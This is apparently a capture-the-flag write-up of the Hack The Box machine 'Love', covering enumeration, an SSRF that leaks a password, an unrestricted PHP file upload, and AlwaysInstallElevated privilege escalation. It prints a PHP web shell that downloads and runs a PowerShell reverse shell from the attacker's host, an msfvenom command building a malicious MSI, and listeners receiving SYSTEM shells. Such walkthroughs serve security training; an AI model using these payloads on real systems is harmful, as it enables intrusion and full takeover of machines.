---
layout: default
---


# Love

# Enumeration

Port scan reported the following opened ports.

```bash
PORT      STATE SERVICE      REASON
80/tcp    open  http         syn-ack
135/tcp   open  msrpc        syn-ack
139/tcp   open  netbios-ssn  syn-ack
443/tcp   open  https        syn-ack
445/tcp   open  microsoft-ds syn-ack
3306/tcp  open  mysql        syn-ack
5000/tcp  open  upnp         syn-ack
5040/tcp  open  unknown      syn-ack
5985/tcp  open  wsman        syn-ack
5986/tcp  open  wsmans       syn-ack
7680/tcp  open  pando-pub    syn-ack
47001/tcp open  winrm        syn-ack
49664/tcp open  unknown      syn-ack
49665/tcp open  unknown      syn-ack
49666/tcp open  unknown      syn-ack
49667/tcp open  unknown      syn-ack
49668/tcp open  unknown      syn-ack
49669/tcp open  unknown      syn-ack
49670/tcp open  unknown      syn-ack
```

## Port 135

- RPC
- Need credentials

```bash
┌──(kali㉿kali)-[~]
└─$ rpcclient -U '%' 10.10.10.239
Cannot connect to server.  Error was NT_STATUS_ACCESS_DENIED
```

## Port 139/445

- SMB
- Need credentials

```bash
┌──(kali㉿kali)-[~]
└─$ smbclient -L \\\\10.10.10.239\\ -N  
session setup failed: NT_STATUS_ACCESS_DENIED
```

## Port 3306

- MySQL - MariaDB
- Cannot connect remotely

```bash
┌──(kali㉿kali)-[~]
└─$ mysql -h 10.10.10.239                               
ERROR 1130 (HY000): Host '10.10.14.12' is not allowed to connect to this MariaDB server
```

## Port 80/443

- HTTP and HTTPs
- Certificate

```bash
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=staging.love.htb/organizationName=ValentineCorp/stateOrProvinceName=m/countryName=in/localityName=norway/emailAddress=roy@love.htb/organizationalUnitName=love.htb
| Issuer: commonName=staging.love.htb/organizationName=ValentineCorp/stateOrProvinceName=m/countryName=in/localityName=norway/emailAddress=roy@love.htb/organizationalUnitName=love.htb
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-01-18T14:00:16
| Not valid after:  2022-01-18T14:00:16
| MD5:   bff0:1add:5048:afc8:b3cf:7140:6e68:5ff6
| SHA-1: 83ed:29c4:70f6:4036:a6f4:2d4d:4cf6:18a2:e9e4:96c2
```

We have two interesting things.

- File scanning using URL

![Untitled](Love%207f5a8d34fc0145668dfbfac1e5213542/Untitled.png)

- Logging into vote system

![Untitled](Love%207f5a8d34fc0145668dfbfac1e5213542/Untitled%201.png)

### File scanner

- When we request a file we can see the ouptut → php code injection, SSRF, ¿LFI?
- No PHP execution

![Untitled](Love%207f5a8d34fc0145668dfbfac1e5213542/Untitled%202.png)

- Vulnerable to SSRF  → making a request to http://localhost:5000 leaked a password.

![Untitled](Love%207f5a8d34fc0145668dfbfac1e5213542/Untitled%203.png)

### Voting system

The creadentials are not valid for the login in the **index.php**, but bruteforcing reveals a directory  called **admin** where we can log in and have access to the admin panel.

From here we have to enumerate each section and see if we can trigger any vulnerability.

If we go to voters sections we will be able to create a user and add a photo to him. Maybe we are able to upload a PHP file.

There is also a **print** functionality but it seems broken.

```bash
Warning: "continue" targeting switch is equivalent to "break". Did you mean to use "continue 2"? in C:\xampp\htdocs\omrs\tcpdf\tcpdf.php on line 17778
TCPDF ERROR: Some data has already been output, can't send PDF file
```

- `C:\xampp\htdocs\omrs\tcpdf\tcpdf.php`

If we upload a PHP file as a profile image for a new user it will upload an execute without any  problems.

```bash
<img src='../images/test.php' width='30px' height='30px'>
<a href='#edit_photo' data-toggle='modal' class='pull-right photo' data-id='3'><span class='fa fa-edit'></span></a>
```

![Untitled](Love%207f5a8d34fc0145668dfbfac1e5213542/Untitled%204.png)

In this case the PHP simply called **phpinfo()** function.

# Foothold

To gain access to the machine we will upload the following PHP script.

```bash
<?php system('powershell -ep bypass -c "iex(new-object net.webclient).downloadstring(\'http://10.10.14.12/Invoke-PowerShellTcp.ps1\')"'); ?>
```

- Upload the file
- Access to it
- We have a reverse shell

```bash
┌──(kali㉿kali)-[~]
└─$ rlwrap nc -nvlp 443                                          
listening on [any] 443 ...
connect to [10.10.14.12] from (UNKNOWN) [10.10.10.239] 55420
Windows PowerShell running as user Phoebe on LOVE
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\xampp\htdocs\omrs\images>whoami
love\phoebe
```

# Privilege escalation

Afte some basic enumeration I will eun PowerUp, and we have something.

```bash
Check         : AlwaysInstallElevated Registry Key
AbuseFunction : Write-UserAddMSI
```

Seems like we can escalate using AlwaysInstallElevated manner. To double check this we can run the following, and if we have 0x1 in the output means that we can leverage the vulnerability.

```bash
PS C:\Users\Phoebe> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer
    AlwaysInstallElevated    REG_DWORD    0x1
```

We generate a maliciuos MSI file.

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=172.16.1.30 LPORT=443 -a x64 --platform Windows -f msi -o evil.msi
```

- Upload to victim
- Set a listener
- Execute

```bash
PS C:\Users\Phoebe> copy \\10.10.14.12\share\evil.msi .
PS C:\Users\Phoebe> .\evil.msi
PS C:\Users\Phoebe>
```

- Should have  shell

```bash
┌──(kali㉿kali)-[~/tools]
└─$ nc -lvnp 443                                                 
listening on [any] 443 ...
connect to [10.10.14.12] from (UNKNOWN) [10.10.10.239] 55426
Microsoft Windows [Version 10.0.19042.867]
(c) 2020 Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32>whoami
whoami
nt authority\system
```